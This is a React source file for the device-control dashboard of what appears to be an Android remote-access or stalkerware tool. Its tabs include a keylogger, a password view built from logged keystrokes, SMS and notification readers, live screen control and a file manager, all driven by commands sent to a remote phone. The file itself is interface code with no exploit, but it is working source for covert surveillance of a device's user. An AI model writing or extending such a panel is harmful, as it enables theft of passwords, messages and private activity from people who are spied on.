import React, { useState } from 'react';
import CommandPanel from './CommandPanel.jsx';
import ResultPanel from './ResultPanel.jsx';
import ScreenControl from './ScreenControl.jsx';
import ScreenReaderView from './ScreenReaderView.jsx';
import KeyloggerTab from './KeyloggerTab.jsx';
import AppManager from './AppManager.jsx';
import AppMonitorTab from './AppMonitorTab.jsx';
import PermissionsTab from './PermissionsTab.jsx';
import NotificationsTab from './NotificationsTab.jsx';
import RecentActivityTab from './RecentActivityTab.jsx';
import LiveMonitor from './LiveMonitor.jsx';
import TaskStudio from './TaskStudio.jsx';
import PasswordsTab from './PasswordsTab.jsx';
import ControlCenter from './ControlCenter.jsx';
import GestureTab from './GestureTab.jsx';
import SMSManagerTab from './SMSManagerTab.jsx';
import FileManagerTab from './FileManagerTab.jsx';

const TABS = [
  { id: 'control_center',label: '🎮 Control Center' },
  { id: 'live_monitor',  label: '📊 Live Monitor' },
  { id: 'commands',      label: '⌨️ Commands' },
  { id: 'screen_control',label: '🖥️ Screen Control' },
  { id: 'screen_reader', label: '📺 Screen Reader' },
  { id: 'task_studio',   label: '🎬 Task Studio' },
  { id: 'passwords',     label: '🔑 Passwords' },
  { id: 'notifications', label: '🔔 Notifications' },
  { id: 'sms_manager',   label: '💬 SMS Manager' },
  { id: 'activity',      label: '📱 Activity' },
  { id: 'keylogger',     label: '⌨️ Keylogger' },
  { id: 'file_manager',  label: '📂 Files' },
  { id: 'app_manager',   label: '📦 App Manager' },
  { id: 'app_monitor',   label: '📡 App Monitor' },
  { id: 'permissions',   label: '🛡️ App Mode' },
  { id: 'gestures',      label: '✋ Gestures' },
];

export default function DeviceControl({ device, sendCommand, results, pending, onBack, streamFrame, send, keylogPushEntries, notifPushEntries, activityAppEntries, screenReaderPushData, serverLatency, deviceLatency }) {
  const [activeTab, setActiveTab] = useState('control_center');
  const info     = device.deviceInfo || {};
  const isOnline = device.isOnline;

  const handleCommand = (command, params) => {
    sendCommand(device.deviceId, command, params);
  };

  return (
    <div className="device-control">
      <div className="dc-header">
        <button className="btn-back" onClick={onBack}>← Back</button>
        <span style={{ fontSize: 22 }}>📱</span>
        <div>
          <div className="dc-title">{device.deviceName || device.deviceId}</div>
          <div style={{ fontSize: 12, color: '#94a3b8' }}>
            {info.manufacturer} {info.model} · Android {info.androidVersion || 'N/A'}
            {info.screenWidth && ` · ${info.screenWidth}×${info.screenHeight}`}
          </div>
        </div>
        <span className={`dc-status ${isOnline ? 'online' : 'offline'}`}>
          {isOnline ? '● ONLINE' : '● OFFLINE'}
        </span>
        <button
          title="Force the device to close and re-open all connections to the server"
          onClick={() => sendCommand(device.deviceId, 'restart_connection')}
          style={{ background: '#1e1b4b', border: '1px solid #4c1d95', color: '#a78bfa', borderRadius: 6, padding: '5px 12px', fontSize: 12, cursor: 'pointer', whiteSpace: 'nowrap' }}
        >
          🔄 Restart Connection
        </button>
      </div>

      {!isOnline && (
        <div style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.3)', borderRadius: 8, padding: '10px 14px', marginBottom: 16, color: '#ef4444', fontSize: 13 }}>
          ⚠️ Device is offline. Commands will fail until device reconnects.
        </div>
      )}

      <div className="pending-banner" style={{ visibility: pending.length > 0 ? 'visible' : 'hidden' }}>
        ⏳ {pending.length} command{pending.length > 1 ? 's' : ''} waiting for device response…
      </div>

      <div className="device-info-grid">
        <div className="di-item">
          <div className="di-label">Device ID</div>
          <div className="di-value" style={{ fontSize: 11, fontFamily: 'monospace' }}>{device.deviceId}</div>
        </div>
        <div className="di-item">
          <div className="di-label">Model</div>
          <div className="di-value">{info.model || '—'}</div>
        </div>
        <div className="di-item">
          <div className="di-label">Android</div>
          <div className="di-value">{info.androidVersion || '—'}</div>
        </div>
        <div className="di-item">
          <div className="di-label">Resolution</div>
          <div className="di-value">{info.screenWidth ? `${info.screenWidth}×${info.screenHeight}` : '—'}</div>
        </div>
      </div>

      <div className="dc-tabs">
        {TABS.map(tab => (
          <button
            key={tab.id}
            className={`dc-tab-btn ${activeTab === tab.id ? 'active' : ''}`}
            onClick={() => setActiveTab(tab.id)}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {activeTab === 'control_center' && (
        <div style={{ flex: 1, minHeight: 0, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
          <ControlCenter
            device={device}
            sendCommand={sendCommand}
            results={results}
            streamFrame={streamFrame}
            send={send}
            serverLatency={serverLatency}
            deviceLatency={deviceLatency}
            onTabChange={setActiveTab}
            screenReaderPushData={screenReaderPushData}
          />
        </div>
      )}

      {activeTab === 'live_monitor' && (
        <LiveMonitor
          notifEntries={notifPushEntries || []}
          activityEntries={activityAppEntries || []}
          keylogEntries={keylogPushEntries || []}
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      )}

      {activeTab === 'commands' && (
        <div className="dc-layout">
          <CommandPanel
            onSend={handleCommand}
            disabled={!isOnline}
            pendingCommands={pending.map(p => p.command)}
          />
          <ResultPanel results={results} />
        </div>
      )}

      {activeTab === 'screen_control' && (
        <ScreenControl
          device={device}
          sendCommand={sendCommand}
          streamFrame={streamFrame}
          send={send}
        />
      )}

      {activeTab === 'screen_reader' && (
        <ScreenReaderView
          device={device}
          sendCommand={sendCommand}
          results={results}
          screenPushData={screenReaderPushData}
        />
      )}

      {activeTab === 'task_studio' && (
        <TaskStudio
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      )}

      {activeTab === 'passwords' && (
        <PasswordsTab
          device={device}
          sendCommand={sendCommand}
          results={results}
          keylogPushEntries={keylogPushEntries || []}
        />
      )}

      {activeTab === 'notifications' && (
        <NotificationsTab
          device={device}
          sendCommand={sendCommand}
          results={results}
          notifPushEntries={notifPushEntries || []}
        />
      )}

      {activeTab === 'activity' && (
        <RecentActivityTab
          device={device}
          activityEntries={activityAppEntries || []}
        />
      )}

      {activeTab === 'keylogger' && (
        <KeyloggerTab
          device={device}
          sendCommand={sendCommand}
          results={results}
          keylogPushEntries={keylogPushEntries || []}
        />
      )}

      {activeTab === 'file_manager' && (
        <FileManagerTab
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      )}

      {activeTab === 'app_manager' && (
        <AppManager
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      )}

      {activeTab === 'app_monitor' && (
        <AppMonitorTab
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      )}

      {activeTab === 'permissions' && (
        <PermissionsTab
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      )}

      {activeTab === 'sms_manager' && (
        <SMSManagerTab
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      )}

      {activeTab === 'gestures' && (
        <GestureTab
          device={device}
          sendCommand={sendCommand}
          results={results}
        />
      )}
    </div>
  );
}
